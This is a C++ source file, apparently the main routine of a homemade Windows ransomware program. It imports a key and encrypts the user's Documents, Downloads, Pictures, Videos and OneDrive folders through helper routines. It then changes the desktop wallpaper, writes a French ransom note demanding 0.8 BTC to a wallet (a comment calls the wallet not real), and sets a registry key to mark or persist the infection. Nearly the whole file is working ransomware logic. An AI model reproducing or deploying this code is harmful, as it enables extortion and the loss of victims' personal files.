#include <iostream>
#include <fstream>
#include <Windows.h>
#include "strsafe.h"
#include <ShlObj.h>
#include "encrypt.h"
#include "persistence.h"



int main() {

	if (checkForRegkey() == 0) {

		ExitProcess(1);

	}

	HCRYPTKEY key = keyimport();

	LPCWSTR targetDirs[] = { L"\\Documents",L"\\Downloads",L"\\Images",L"\\Videos",L"\\Pictures",L"\\OneDrive"};
	LPWSTR userDir;
	for (LPCWSTR singledir : targetDirs) {
		
		SHGetKnownFolderPath(FOLDERID_Profile, 0, NULL, &userDir);
		WCHAR* absoluteDirPath = userDir;
		StringCchCatW(absoluteDirPath, MAX_PATH, singledir);
		traverse(absoluteDirPath,key);
	}

	//traverse(L"\\testShare:\\", key);

	LPCWSTR wallpapePath = L"C:\\Windows\\Temp\\kekchose.png";
	bool res = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)wallpapePath, SPIF_UPDATEINIFILE);

	//It's not a real wallet ofc
	std::ofstream myfile(L"C:\\Users\\placeholder\\Desktop\\ransom note.txt");
	myfile << "Vos fichiers encryptés !!! Payez la rançon 0.8 BTC sur wallet : 19BY2XCgbDe7WtTVbTyzM92R3LYr6VitWK" << std::endl;
	myfile.close();

	setRegkey();

	return 0;
}